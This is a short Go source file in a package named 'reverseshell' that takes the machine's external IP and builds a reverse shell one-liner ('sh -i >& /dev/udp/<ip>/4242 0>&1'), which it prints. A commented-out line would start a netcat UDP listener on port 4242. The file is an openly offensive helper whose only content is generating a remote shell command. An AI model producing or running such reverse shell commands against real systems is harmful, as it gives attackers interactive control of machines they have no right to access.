package reverseshell

import (
	"fmt"
	"myapp/lib/sysinfo"
)

func ReverseShell() {
	externalip, err := sysinfo.GetExtIP()
	if err != nil {
		return
	}
	targetcmd := "sh -i >& /dev/udp/" + externalip + "/4242 0>&1"
	// listenercmd, err := exec.Command("nc", "u", "-lvp", "4242").Output()
	fmt.Println("Target command:", targetcmd)
}
